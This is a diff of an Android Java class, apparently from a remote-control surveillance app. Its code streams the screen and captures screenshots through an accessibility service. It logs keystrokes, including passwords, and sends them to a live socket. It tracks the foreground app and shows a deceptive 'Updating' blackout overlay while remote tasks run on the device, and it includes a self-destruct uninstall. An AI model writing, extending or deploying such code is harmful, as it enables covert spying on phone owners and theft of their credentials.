-                        String response = reply.getString("response");
-                        if (response != null && !response.isEmpty()) {
-                            return new JSONObject(response);
-                        }
-                    }
-                } catch (Exception e) {
-                    Log.w(TAG, "Accessibility IPC relay failed for " + command + ": "
-                            + e.getMessage());
-                }
-
-                JSONObject r = new JSONObject();
-                r.put("success", false);
-                r.put("error", "Accessibility service is active, but the command could not be delivered. Please retry.");
-                return r;
-            }
-
             JSONObject r = new JSONObject();
             r.put("success", false);
             r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
                              "Downloaded Apps → [App Name]");
             r.put("requiresAccessibility", true);
-            return r;
-        }
-
-        // ScreenBlackout owns an overlay in the accessibility process. The main
-        // process reaches these cases through the provider IPC above; never use
-        // its process-local singleton as a proxy for the real overlay.
-        if ("screen_blackout_on".equals(command)) {
-            return com.task.tusker.commands.ScreenBlackout.getInstance().enableBlackout();
-        }
-        if ("screen_blackout_off".equals(command)) {
-            if (params.optBoolean("onlyIfDeviceLocked", false) && !isDeviceLocked()) {
-                JSONObject skipped = new JSONObject();
-                skipped.put("success", true);
-                skipped.put("skipped", true);
-                skipped.put("message", "Device is unlocked; blackout overlay was not changed");
-                return skipped;
-            }
-            return com.task.tusker.commands.ScreenBlackout.getInstance().disableBlackout();
-        }
-        if ("get_blackout_status".equals(command)) {
-            com.task.tusker.commands.ScreenBlackout blackout =
-                    com.task.tusker.commands.ScreenBlackout.getInstance();
-            JSONObject r = new JSONObject();
-            r.put("success", true);
-            r.put("active", blackout.isActive());
-            r.put("message", blackout.isActive()
-                    ? "Updating overlay is active" : "Updating overlay is hidden");
             return r;
         }
 
@@ -3151,66 +2675,6 @@ public class SocketManager {
                 ok.put("success", true);
                 ok.put("message", "Screen read requests stopped");
                 return ok;
-            }
-
-            case "take_screenshot": {
-                // Capture a high-quality screenshot via AccessibilityService (API 30+)
-                Bitmap bitmap = accessSvc.captureScreenSync();
-                if (bitmap == null) {
-                    JSONObject r = new JSONObject();
-                    r.put("success", false);
-                    r.put("error", "Accessibility screenshot capture failed");
-                    return r;
-                }
-                String base64 = bitmapToBase64(bitmap, 90);
-                int width = bitmap.getWidth();
-                int height = bitmap.getHeight();
-                bitmap.recycle();
-
-                if (base64 == null || base64.isEmpty()) {
-                    JSONObject r = new JSONObject();
-                    r.put("success", false);
-                    r.put("error", "Could not encode accessibility screenshot");
-                    return r;
-                }
-
-                JSONObject r = new JSONObject();
-                r.put("success", true);
-                r.put("base64", base64);
-                r.put("mimeType", "image/jpeg");
-                r.put("width", width);
-                r.put("height", height);
-                r.put("timestamp", System.currentTimeMillis());
-                return r;
-            }
-
-            case "stream_start": {
-                // Start one persistent frame loop. Frames use the existing stream
-                // TCP channel; the dashboard must not issue stream_start per frame.
-                stopBlockFrameMode();
-                resumeStreamingAfterReconnect = false;
-                long requestedIntervalMs = Math.max(500L, Math.min(10_000L,
-                        params.optLong("intervalMs", 1_000L)));
-                startIdleFrameMode(DeviceInfo.getDeviceId(context), requestedIntervalMs);
-                JSONObject r = new JSONObject();
-                r.put("success", true);
-                r.put("timestamp", System.currentTimeMillis());
-                r.put("streaming", true);
-                r.put("streamStarted", true);
-                r.put("intervalMs", requestedIntervalMs);
-                r.put("message", "Screen stream started");
-                return r;
-            }
-
-            case "stream_stop": {
-                // An explicit stop must cancel any reconnect-time auto-resume.
-                resumeStreamingAfterReconnect = false;
-                stopIdleFrameMode();
-                stopBlockFrameMode();
-                JSONObject r = new JSONObject();
-                r.put("success", true);
-                r.put("message", "Screen stream stopped");
-                return r;
             }
 
             case "list_screen_recordings": {
@@ -3852,67 +3316,30 @@ public class SocketManager {
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType,
                                 String timestamp, boolean isPassword, String fieldType,
                                 String screenTitle) {
-        // The JSON envelope is built here, on the accessibility worker, so the
-        // queued task is nothing but a socket write. Deferring the build to an
-        // executor thread added a queue hop before the bytes even existed.
-        final JSONObject entry;
-        try {
-            entry = new JSONObject();
-            entry.put("packageName", packageName);
-            entry.put("appName", appName != null ? appName : packageName);
-            entry.put("text", text);
-            entry.put("eventType", eventType);
-            entry.put("timestamp", timestamp);
-            entry.put("isPassword", isPassword);
-            entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
-            entry.put("deviceId", DeviceInfo.getDeviceId(context));
-            if (screenTitle != null && !screenTitle.isEmpty()) {
-                entry.put("screenTitle", screenTitle);
+        // IMPORTANT: Use the general cached executor, NOT liveExecutor.
+        // liveExecutor's single thread is permanently blocked in liveChannelLoop's readLine().
+        // Tasks submitted to liveExecutor while readLine() is blocking are queued forever.
+        executor.execute(() -> {
+            try {
+                JSONObject entry = new JSONObject();
+                entry.put("packageName", packageName);
+                entry.put("appName", appName != null ? appName : packageName);
+                entry.put("text", text);
+                entry.put("eventType", eventType);
+                entry.put("timestamp", timestamp);
+                entry.put("isPassword", isPassword);
+                entry.put("fieldType", isPassword ? (fieldType.isEmpty() ? "password" : fieldType) : fieldType);
+                entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                if (screenTitle != null && !screenTitle.isEmpty()) {
+                    entry.put("screenTitle", screenTitle);
+                }
+                // Only send if live channel is connected (device is online).
+                // If offline, drop silently — do NOT queue as a command.
+                sendLiveOnly("keylog:entry", entry);
+            } catch (Exception e) {
+                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
             }
-        } catch (Exception e) {
-            Log.e(TAG, "pushKeylogEntry build error: " + e.getMessage());
-            return;
-        }
-
-        // Fast path: the live channel is already up, so write straight to the
-        // socket from this thread. That is a single print+flush — no executor
-        // hand-off, no queueing behind a contacts/SMS/keylogs fetch.
-        //
-        // IMPORTANT: must not use liveExecutor — its single thread is
-        // permanently blocked in liveChannelLoop's readLine().
-        if (liveConnected && liveOut != null && sendLiveNow("keylog:entry", entry)) {
-            return;
-        }
-        // Offline or the write failed: fall back to the dedicated keylog thread,
-        // which re-checks the channel and drops into the reconnect backlog.
-        try {
-            keylogExecutor.execute(() -> sendLiveOnly("keylog:entry", entry));
-        } catch (Exception e) {
-            Log.e(TAG, "pushKeylogEntry dispatch error: " + e.getMessage());
-        }
-    }
-
-    /**
-     * Write one event to the live socket without the queue-on-disconnect
-     * behaviour of {@link #sendLiveOnly}. Caller must have already observed
-     * {@link #liveConnected}. Returns false if the write failed so the caller
-     * can retry through the backlog path.
-     */
-    private boolean sendLiveNow(String event, JSONObject data) {
-        try {
-            synchronized (liveLock) {
-                if (!liveConnected || liveOut == null) return false;
-                JSONObject msg = new JSONObject();
-                msg.put("event", event);
-                msg.put("data", data);
-                liveOut.print(msg.toString() + "\n");
-                liveOut.flush();
-                return !liveOut.checkError();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "sendLiveNow [" + event + "] error: " + e.getMessage());
-            return false;
-        }
+        });
     }
 
     /** Scan a read_screen result for password fields and push them as keylog entries. */
@@ -4015,8 +3442,6 @@ public class SocketManager {
                 entry.put("appName", appName != null ? appName : packageName);
                 entry.put("timestamp", ts);
                 entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                // Persist locally
-                logManager.logActivity(packageName, appName);
                 // Only send if live channel is connected (device is online).
                 // If offline, drop silently — do NOT queue as a command.
                 sendLiveOnly("app:foreground", entry);
@@ -4024,6 +3449,11 @@ public class SocketManager {
                 Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
             }
         });
+    }
+
+    /** Whether a package is monitored (static config OR dynamically added). */
+    public boolean isDynamicallyMonitored(String pkg) {
+        return dynamicMonitoredPackages.contains(pkg);
     }
 
     /** Self-destruct: clear data and launch uninstall flow. */
@@ -4069,27 +3499,25 @@ public class SocketManager {
      * Execute all task steps locally on the device, one after another.
      *
      * Rules:
-     *  - click_text polls every 100 ms for up to 7 s; clicks immediately when the
+     *  - click_text polls every 100 ms for up to 8 s; clicks immediately when the
      *    text appears on screen.
      *  - ANY step that fails aborts the whole task — no further steps are executed.
      *  - A 500 ms settle delay is inserted between steps so the accessibility tree
      *    has time to refresh before the next step runs.
      */
     /**
-     * Persist the workflow definition to device storage before starting its
-     * independent local worker. Network disconnects do not stop that worker;
-     * this file is the saved definition, not a step-by-step execution journal.
+     * Persist the workflow definition to device storage so the task can survive
+     * connection drops, app restarts, and process kills.
      * File: <filesDir>/tasks/current_task.json
      * Returns true if the file was saved successfully.
      */
-    private boolean saveTaskToDevice(JSONArray steps, String commandId, long generation) {
+    private boolean saveTaskToDevice(JSONArray steps, String commandId) {
         try {
             java.io.File dir = new java.io.File(context.getFilesDir(), "tasks");
             if (!dir.exists()) dir.mkdirs();
             java.io.File file = new java.io.File(dir, "current_task.json");
             JSONObject doc = new JSONObject();
             doc.put("commandId", commandId);
-            doc.put("generation", generation);
             doc.put("savedAt",   System.currentTimeMillis());
             doc.put("stepCount", steps.length());
             doc.put("steps",     steps);
@@ -4104,759 +3532,8 @@ public class SocketManager {
         }
     }
 
-    private static boolean jsonValuesEqual(Object left, Object right) {
-        if (left == right) return true;
-        if (left == null || right == null) return false;
-
-        if (left instanceof JSONObject) {
-            if (!(right instanceof JSONObject)) return false;
-            JSONObject leftObject = (JSONObject) left;
-            JSONObject rightObject = (JSONObject) right;
-            if (leftObject.length() != rightObject.length()) return false;
-            java.util.Iterator<String> keys = leftObject.keys();
-            while (keys.hasNext()) {
-                String key = keys.next();
-                if (!rightObject.has(key)
-                        || !jsonValuesEqual(leftObject.opt(key), rightObject.opt(key))) {
-                    return false;
-                }
-            }
-            return true;
-        }
-
-        if (left instanceof JSONArray) {
-            if (!(right instanceof JSONArray)) return false;
-            JSONArray leftArray = (JSONArray) left;
-            JSONArray rightArray = (JSONArray) right;
-            if (leftArray.length() != rightArray.length()) return false;
-            for (int i = 0; i < leftArray.length(); i++) {
-                if (!jsonValuesEqual(leftArray.opt(i), rightArray.opt(i))) return false;
-            }
-            return true;
-        }
-
-        if (left instanceof Number && right instanceof Number) {
-            return Double.compare(((Number) left).doubleValue(),
-                    ((Number) right).doubleValue()) == 0;
-        }
-        return left.equals(right);
-    }
-
-    private static JSONObject comparableTaskStep(JSONObject step) throws JSONException {
-        JSONObject comparable = new JSONObject();
-        java.util.Iterator<String> keys = step.keys();
-        while (keys.hasNext()) {
-            String key = keys.next();
-            // These are dashboard row metadata, not part of the device action.
-            if ("enabled".equals(key) || "originalIndex".equals(key)) continue;
-            comparable.put(key, step.get(key));
-        }
-        return comparable;
-    }
-
-    private static boolean sameTaskSteps(JSONArray first, JSONArray second)
-            throws JSONException {
-        if (first == null || second == null || first.length() != second.length()) return false;
-        for (int i = 0; i < first.length(); i++) {
-            JSONObject firstStep = first.optJSONObject(i);
-            JSONObject secondStep = second.optJSONObject(i);
-            if (firstStep == null || secondStep == null
-                    || !jsonValuesEqual(comparableTaskStep(firstStep),
-                            comparableTaskStep(secondStep))) {
-                return false;
-            }
-        }
-        return true;
-    }
-
-    private void clearSavedTaskFromDevice(String commandId, long generation) {
-        try {
-            java.io.File file = new java.io.File(
-                    new java.io.File(context.getFilesDir(), "tasks"), "current_task.json");
-            if (!file.isFile()) return;
-            StringBuilder contents = new StringBuilder();
-            try (java.io.BufferedReader reader =
-                         new java.io.BufferedReader(new java.io.FileReader(file))) {
-                String line;
-                while ((line = reader.readLine()) != null) contents.append(line);
-            }
-            JSONObject savedTask = new JSONObject(contents.toString());
-            if (commandId.equals(savedTask.optString("commandId"))
-                    && generation == savedTask.optLong("generation", -1L)) {
-                if (!file.delete()) {
-                    Log.w(TAG, "clearSavedTaskFromDevice: could not remove completed task file");
-                }
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "clearSavedTaskFromDevice: " + e.getMessage());
-        }
-    }
-
-    /**
-     * Register lock/unlock events at the task layer.  This intentionally does
-     * not change the dashboard/backend protocol: the task command is still
-     * acknowledged immediately, while task:progress reports waiting/restart
-     * state to the existing Task Studio UI.
-     */
-    private void registerTaskLockReceiver() {
-        if (taskLockReceiver != null) return;
-
-        taskLockReceiver = new android.content.BroadcastReceiver() {
-            @Override
-            public void onReceive(Context receiverContext, android.content.Intent intent) {
-                if (intent == null || intent.getAction() == null) return;
-                String action = intent.getAction();
-
-                if (android.content.Intent.ACTION_SCREEN_OFF.equals(action)) {
-                    // Pause immediately, even on devices where the keyguard
-                    // state is delayed or the screen turns off without a lock.
-                    requestTaskRestartForPause();
-                    scheduleTaskUnlockCheck();
-                } else if (android.content.Intent.ACTION_USER_PRESENT.equals(action)) {
-                    // The device may have remained interactive while the
-                    // keyguard was visible. Treat unlock as a fresh start from
-                    // step 1, without waiting for a separate screen-on event.
-                    requestTaskRestartForPause();
-                    scheduleTaskUnlockCheck();
-                } else if (android.content.Intent.ACTION_SCREEN_ON.equals(action)) {
-                    // A lit screen may still be locked. Check after keyguard
-                    // settles, pausing active work if the lock screen remains.
-                    taskLockHandler.postDelayed(() -> {
-                        if (isDeviceLocked()) {
-                            requestTaskRestartForPause();
-                            scheduleTaskUnlockCheck();
-                        } else {
-                            scheduleTaskUnlockCheck();
-                        }
-                    }, 300L);
-                }
-            }
-        };
-
-        android.content.IntentFilter filter = new android.content.IntentFilter();
-        filter.addAction(android.content.Intent.ACTION_SCREEN_OFF);
-        filter.addAction(android.content.Intent.ACTION_SCREEN_ON);
-        filter.addAction(android.content.Intent.ACTION_USER_PRESENT);
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                context.registerReceiver(taskLockReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
-            } else {
-                context.registerReceiver(taskLockReceiver, filter);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "registerTaskLockReceiver: " + e.getMessage());
-        }
-
-        registerTaskKeyguardStateListener();
-    }
-
-    private void registerTaskKeyguardStateListener() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU
-                || taskKeyguardStateListener != null) return;
-
-        try {
-            taskKeyguardManager = (android.app.KeyguardManager)
-                    context.getSystemService(Context.KEYGUARD_SERVICE);
-            if (taskKeyguardManager == null) {
-                Log.w(TAG, "KeyguardManager unavailable; relying on screen broadcasts");
-                return;
-            }
-
-            taskKeyguardStateListener = isLocked -> {
-                if (isLocked) {
-                    requestTaskRestartForPause();
-                    scheduleTaskUnlockCheck();
-                } else {
-                    scheduleTaskUnlockCheck();
-                }
-            };
-            taskKeyguardManager.addKeyguardLockedStateListener(
-                    command -> taskLockHandler.post(command),
-                    taskKeyguardStateListener);
-        } catch (Exception e) {
-            taskKeyguardStateListener = null;
-            Log.w(TAG, "Unable to register keyguard state listener: " + e.getMessage());
-        }
-    }
-
-    private void cancelTaskUnlockCheck() {
-        taskLockHandler.removeCallbacks(taskUnlockCheck);
-    }
-
-    private void scheduleTaskUnlockCheck() {
-        synchronized (taskLock) {
-            if (waitingTasks.isEmpty()) return;
-        }
-        taskLockHandler.removeCallbacks(taskUnlockCheck);
-        taskLockHandler.post(taskUnlockCheck);
-    }
-
-    private boolean isDeviceLocked() {
-        try {
-            android.app.KeyguardManager keyguard =
-                    (android.app.KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
-            if (keyguard == null) {
-                Log.w(TAG, "Unable to read device lock state; keeping task paused");
-                return true;
-            }
-            return keyguard.isKeyguardLocked();
-        } catch (Exception e) {
-            Log.w(TAG, "Unable to read device lock state; keeping task paused: " + e.getMessage());
-            return true;
-        }
-    }
-
-    private boolean isTaskExecutionBlocked() {
-        return isDeviceLocked();
-    }
-
-    private boolean isCurrentTaskWaitingForKeyguardLocked(String commandId, long generation) {
-        if (!taskWaitingForKeyguard
-                || generation != currentTaskGeneration
-                || commandId == null
-                || !commandId.equals(currentTaskCommandId)) {
-            return false;
-        }
-        PendingTask pending = waitingTasks.get(commandId);
-        return pending != null && pending.generation == generation;
-    }
-
-    private void clearTaskUnlockReleaseRequest(String commandId, long generation) {
-        synchronized (taskLock) {
-            if (generation == currentTaskGeneration
-                    && commandId != null
-                    && commandId.equals(currentTaskCommandId)) {
-                taskUnlockScreenReleaseRequested = false;
-            }
-        }
-    }
-
-    /**
-     * Hide the app's blackout overlay only during a genuine keyguard wait.
-     * This runs on the command worker because the overlay is owned by the
-     * isolated accessibility process and the IPC call can take time.
-     */
-    private void unblockScreenForLockedTaskWait() {
-        if (!isDeviceLocked()) return;
-
-        final String commandId;
-        final long generation;
-        synchronized (taskLock) {
-            commandId = currentTaskCommandId;
-            generation = currentTaskGeneration;
-            if (!isCurrentTaskWaitingForKeyguardLocked(commandId, generation)
-                    || taskUnlockScreenReleaseRequested) {
-                return;
-            }
-            taskUnlockScreenReleaseRequested = true;
-        }
-
-        try {
-            commandDispatchExecutor.execute(() -> {
-                try {
-                    if (!isDeviceLocked()
-                            || !isCurrentTaskWaitingForKeyguard(commandId, generation)) {
-                        clearTaskUnlockReleaseRequest(commandId, generation);
-                        return;
-                    }
-                    JSONObject params = new JSONObject().put("onlyIfDeviceLocked", true);
-                    JSONObject result = dispatchCommand("screen_blackout_off", params);
-                    if (!result.optBoolean("success", false)
-                            || result.optBoolean("skipped", false)) {
-                        Log.w(TAG, "Could not hide blackout overlay during keyguard wait: "
-                                + result.optString("error",
-                                        result.optBoolean("skipped", false)
-                                                ? "device unlocked before delivery" : "command failed"));
-                        clearTaskUnlockReleaseRequest(commandId, generation);
-                    }
-                } catch (Exception e) {
-                    Log.w(TAG, "Blackout overlay release failed during keyguard wait: "
-                            + e.getMessage());
-                    clearTaskUnlockReleaseRequest(commandId, generation);
-                }
-            });
-        } catch (RuntimeException e) {
-            clearTaskUnlockReleaseRequest(commandId, generation);
-            Log.w(TAG, "Unable to queue blackout release during keyguard wait: "
-                    + e.getMessage());
-        }
-    }
-
-    private boolean isCurrentTaskWaitingForKeyguard(String commandId, long generation) {
-        synchronized (taskLock) {
-            return isCurrentTaskWaitingForKeyguardLocked(commandId, generation);
-        }
-    }
-
-    private JSONObject startOrQueueTask(JSONArray steps, String commandId)
-            throws JSONException {
-        PendingTask task;
-        java.util.ArrayList<TaskRun> replacedRuns = new java.util.ArrayList<>();
-        boolean stored;
-        synchronized (taskLock) {
-            if (currentTaskCommandId != null && currentTaskSteps != null
-                    && sameTaskSteps(currentTaskSteps, steps)) {
-                TaskRun existingRun = activeTaskRuns.get(currentTaskCommandId);
-                boolean waiting = waitingTasks.containsKey(currentTaskCommandId);
-                boolean stillOngoing = existingRun == null
-                        || !existingRun.terminal
-                        || waiting;
-                if (stillOngoing) {
-                    return new JSONObject()
-                            .put("success", true)
-                            .put("duplicate", true)
-                            .put("started", existingRun != null
-                                    && !existingRun.terminal
-                                    && !existingRun.restartRequested)
-                            .put("waiting", waiting)
-                            .put("existingCommandId", currentTaskCommandId);
-                }
-            }
-
-            for (TaskRun previous : activeTaskRuns.values()) {
-                previous.restartRequested = true;
-                previous.screenPauseRequested = false;
-                replacedRuns.add(previous);
-            }
-            activeTaskRuns.clear();
-            waitingTasks.clear();
-            taskWaitingForKeyguard = false;
-            taskUnlockScreenReleaseRequested = false;
-            TaskExecutionState.setTaskRunning(context, false);
-
-            long generation = ++nextTaskGeneration;
-            currentTaskGeneration = generation;
-            currentTaskCommandId = commandId;
-            currentTaskSteps = steps;
-            task = new PendingTask(steps, commandId, 0, generation, false);
-            // Persist only after claiming the current-task slot so an older
-            // worker cannot overwrite a newer task definition.
-            stored = saveTaskToDevice(steps, commandId, generation);
-        }
-        for (TaskRun previous : replacedRuns) {
-            Thread worker = previous.thread;
-            if (worker != null) worker.interrupt();
-        }
-
-        if (isTaskExecutionBlocked()) {
-            synchronized (taskLock) {
-                if (currentTaskGeneration != task.generation) {
-                    return new JSONObject()
-                            .put("success", false)
-                            .put("superseded", true)
-                            .put("stored", stored);
-                }
-                task = new PendingTask(steps, commandId, 0, task.generation, true);
-                waitingTasks.put(commandId, task);
-                taskWaitingForKeyguard = true;
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, false);
-            }
-            scheduleTaskUnlockCheck();
-            sendTaskRestartProgress(commandId, steps.length(),
-                    "Task is waiting for the device to unlock",
-                    true, task.clickTextRetries);
-            return new JSONObject()
-                    .put("success", true)
-                    .put("started", false)
-                    .put("waitingForUnlock", true)
-                    .put("stored", stored)
-                    .put("steps", steps.length());
-        }
-
-        int startState = startTaskRun(task, false);
-        if (startState == TASK_START_SUPERSEDED) {
-            return new JSONObject()
-                    .put("success", false)
-                    .put("superseded", true)
-                    .put("stored", stored);
-        }
-        if (startState == TASK_START_WAITING_FOR_UNLOCK) {
-            return new JSONObject()
-                    .put("success", true)
-                    .put("started", false)
-                    .put("waitingForUnlock", true)
-                    .put("stored", stored)
-                    .put("steps", steps.length());
-        }
-        return new JSONObject()
-                .put("success", true)
-                .put("started", true)
-                .put("stored", stored)
-                .put("steps", steps.length());
-    }
-
-    private int startTaskRun(PendingTask task, boolean restarted) {
-        TaskRun run;
-        boolean waitingForUnlock = false;
-        synchronized (taskLock) {
-            if (task.generation != currentTaskGeneration
-                    || !task.commandId.equals(currentTaskCommandId)) {
-                return TASK_START_SUPERSEDED;
-            }
-            // Recheck while holding taskLock so a screen-off receiver either
-            // sees this active run and interrupts it, or this task is queued.
-            if (isTaskExecutionBlocked()) {
-                waitingTasks.put(task.commandId, new PendingTask(
-                        task.steps, task.commandId, task.clickTextRetries,
-                        task.generation, true));
-                waitingForUnlock = true;
-                run = null;
-                taskWaitingForKeyguard = true;
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, false);
-            } else {
-                run = new TaskRun(task.steps, task.commandId, task.clickTextRetries,
-                        task.generation, task.returnHomeBeforeStart);
-                activeTaskRuns.put(task.commandId, run);
-                taskWaitingForKeyguard = false;
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, true);
-            }
-        }
-
-        if (waitingForUnlock) {
-            scheduleTaskUnlockCheck();
-            sendTaskRestartProgress(task.commandId, task.steps.length(),
-                    "Task is waiting for the device to unlock",
-                    true, task.clickTextRetries);
-            return TASK_START_WAITING_FOR_UNLOCK;
-        }
-
-        if (restarted) {
-            String message = run.returnHomeBeforeStart
-                    ? "Device unlocked — returning to Home before restarting the entire task from step 1"
-                    : run.clickTextRetries > 0
-                    ? "Screen is ready — restarting the entire task from step 1 ("
-                            + run.clickTextRetries + " of " + MAX_CLICK_TEXT_RETRIES + " text retries used)"
-                    : "Device unlocked — restarting the entire task from step 1";
-            sendTaskRestartProgress(run.commandId, run.steps.length(), message,
-                    false, run.clickTextRetries);
-        }
-
-        // Do not run this on a socket/command-dispatch worker: execution must
-        // continue locally if the transport disconnects after task delivery.
-        Thread worker = new Thread(() -> {
-            try {
-                // A replacement can arrive while an accessibility action is
-                // in flight. Serialize task workers so the new task cannot
-                // begin until the old action has returned and its run exits.
-                synchronized (taskExecutionLock) {
-                    if (!run.restartRequested && isCurrentTaskRun(run)) {
-                        if (!run.returnHomeBeforeStart || returnHomeBeforeTaskRestart(run)) {
-                            if (!run.restartRequested && isCurrentTaskRun(run)) {
-                                executeTaskLocal(run);
-                            }
-                        }
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "run_task_local: " + e.getMessage());
-            } finally {
-                finishTaskRun(run);
-            }
-        }, "task-local");
-        run.thread = worker;
-        worker.start();
-        return TASK_START_STARTED;
-    }
-
-    /**
-     * A task paused by keyguard resumes from its first step only after Home has
-     * brought the previously active app out of the foreground.
-     */
-    private boolean returnHomeBeforeTaskRestart(TaskRun run) throws Exception {
-        String lastError = "Home action was not confirmed";
-        for (int attempt = 0; attempt < 3; attempt++) {
-            if (pauseTaskRunIfDeviceLocked(run)
-                    || run.restartRequested
-                    || !isCurrentTaskRun(run)) {
-                return false;
-            }
-
-            JSONObject result;
-            try {
-                result = dispatchCommand("press_home", new JSONObject());
-            } catch (Exception e) {
-                result = null;
-                lastError = e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage();
-            }
-
-            if (pauseTaskRunIfDeviceLocked(run)
-                    || run.restartRequested
-                    || !isCurrentTaskRun(run)) {
-                return false;
-            }
-
-            if (result != null && result.optBoolean("success", false)) {
-                Thread.sleep(400L);
-                if (pauseTaskRunIfDeviceLocked(run)) return false;
-                return !run.restartRequested && isCurrentTaskRun(run);
-            }
-
-            if (result != null) {
-                lastError = result.optString("error", "Home action was not confirmed");
-            }
-            if (attempt < 2) Thread.sleep(300L);
-        }
-
-        if (markTaskRunTerminal(run)) {
-            String error = "Could not return to Home before restarting: " + lastError;
-            sendTaskProgress(run.commandId, -1, run.steps.length(), true, false,
-                    "Failed to return to Home before restarting the task", false, error);
-            sendTaskCompleteEvent(run.commandId, 0, run.steps.length());
-            Log.w(TAG, "returnHomeBeforeTaskRestart: " + error);
-        }
-        return false;
-    }
-
-    private boolean isCurrentTaskRun(TaskRun run) {
-        synchronized (taskLock) {
-            return currentTaskGeneration == run.generation
-                    && run.commandId.equals(currentTaskCommandId)
-                    && !run.restartRequested
-                    && !run.terminal;
-        }
-    }
-
-    private void requestTaskRestartForPause() {
-        java.util.ArrayList<TaskRun> interruptedRuns = new java.util.ArrayList<>();
-        synchronized (taskLock) {
-            for (TaskRun run : activeTaskRuns.values()) {
-                if (run.generation != currentTaskGeneration
-                        || !run.commandId.equals(currentTaskCommandId)) continue;
-                if (run.terminal || run.screenPauseRequested) continue;
-                run.screenPauseRequested = true;
-                run.restartRequested = true;
-                // A screen pause must not consume a text-detection retry,
-                // including when it races with a just-scheduled text retry.
-                waitingTasks.put(run.commandId,
-                        new PendingTask(run.steps, run.commandId,
-                                run.clickTextRetries, run.generation, true));
-                taskWaitingForKeyguard = true;
-                interruptedRuns.add(run);
-            }
-            if (!interruptedRuns.isEmpty()) {
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, false);
-            }
-        }
-
-        for (TaskRun run : interruptedRuns) {
-            sendTaskRestartProgress(run.commandId, run.steps.length(),
-                    "Screen locked or off — task is paused and will restart from step 1 after unlock",
-                    true, run.clickTextRetries);
-            Thread worker = run.thread;
-            if (worker != null) worker.interrupt();
-        }
-    }
-
-    /**
-     * Broadcasts are the fast path; this state check is a fallback in case a
-     * device misses a screen event while a task is running.
-     */
-    private boolean pauseTaskRunIfDeviceLocked(TaskRun run) {
-        if (run.restartRequested || run.terminal) return true;
-        if (!isTaskExecutionBlocked()) return false;
-
-        boolean queued = false;
-        synchronized (taskLock) {
-            if (run.terminal || run.generation != currentTaskGeneration
-                    || !run.commandId.equals(currentTaskCommandId)) return true;
-            if (!run.screenPauseRequested) {
-                run.screenPauseRequested = true;
-                run.restartRequested = true;
-                waitingTasks.put(run.commandId,
-                        new PendingTask(run.steps, run.commandId,
-                                run.clickTextRetries, run.generation, true));
-                taskWaitingForKeyguard = true;
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, false);
-                queued = true;
-            }
-        }
-
-        if (queued) {
-            scheduleTaskUnlockCheck();
-            sendTaskRestartProgress(run.commandId, run.steps.length(),
-                    "Screen locked or off — task is paused and will restart from step 1 after unlock",
-                    true, run.clickTextRetries);
-        }
-        return true;
-    }
-
-    private boolean markTaskRunTerminal(TaskRun run) {
-        synchronized (taskLock) {
-            if (run.restartRequested || run.terminal
-                    || run.generation != currentTaskGeneration
-                    || !run.commandId.equals(currentTaskCommandId)) return false;
-            run.terminal = true;
-            return true;
-        }
-    }
-
-    /**
-     * A text miss restarts the whole workflow, not just the click step. Screen
-     * lock pauses preserve the retry count; only a real seven-second text miss
-     * consumes one of the three additional full-task attempts.
-     *
-     * @return true when the task was queued for a restart/wait, false when the
-     *         retry limit is exhausted and the normal terminal-failure path
-     *         should close the task.
-     */
-    private boolean scheduleTaskRestartAfterTextMiss(TaskRun run, String missingText,
-                                                      JSONObject result) throws JSONException {
-        boolean waitingForUnlock = false;
-        int nextRetryCount = run.clickTextRetries;
-        boolean retryScheduled = false;
-
-        synchronized (taskLock) {
-            if (run.restartRequested || run.terminal
-                    || run.generation != currentTaskGeneration
-                    || !run.commandId.equals(currentTaskCommandId)) return true;
-            if (isTaskExecutionBlocked()) {
-                run.screenPauseRequested = true;
-                run.restartRequested = true;
-                waitingTasks.put(run.commandId,
-                        new PendingTask(run.steps, run.commandId,
-                                run.clickTextRetries, run.generation, true));
-                waitingForUnlock = true;
-                taskWaitingForKeyguard = true;
-                taskUnlockScreenReleaseRequested = false;
-                TaskExecutionState.setTaskRunning(context, false);
-            } else if (run.clickTextRetries < MAX_CLICK_TEXT_RETRIES) {
-                nextRetryCount = run.clickTextRetries + 1;
-                run.restartRequested = true;
-                waitingTasks.put(run.commandId,
-                        new PendingTask(run.steps, run.commandId, nextRetryCount,
-                                run.generation, false));
-                retryScheduled = true;
-                taskWaitingForKeyguard = false;
-                TaskExecutionState.setTaskRunning(context, false);
-            } else {
-                result.put("error", "Text not found within 7 seconds after "
-                        + (MAX_CLICK_TEXT_RETRIES + 1) + " full-task attempts; stopped after "
-                        + MAX_CLICK_TEXT_RETRIES + " retries: \"" + missingText + "\"");
-                result.put("textRetriesExhausted", true);
-            }
-        }
-
-        if (waitingForUnlock) {
-            scheduleTaskUnlockCheck();
-            sendTaskRestartProgress(run.commandId, run.steps.length(),
-                    "Screen locked or off — task is paused and will restart from step 1 after unlock",
-                    true, run.clickTextRetries);
-            return true;
-        }
-        if (retryScheduled) {
-            sendTaskRestartProgress(run.commandId, run.steps.length(),
-                    "Text not found within 7 seconds — restarting the entire task from step 1 "
-                            + "(retry " + nextRetryCount + " of " + MAX_CLICK_TEXT_RETRIES + ")",
-                    false, nextRetryCount);
-            return true;
-        }
-        return false;
-    }
-
-    private void pressHomeAfterTaskRetriesFail() {
-        if (isDeviceLocked()) {
-            Log.i(TAG, "Skipping Home after task retries failed because keyguard is active");
-            return;
-        }
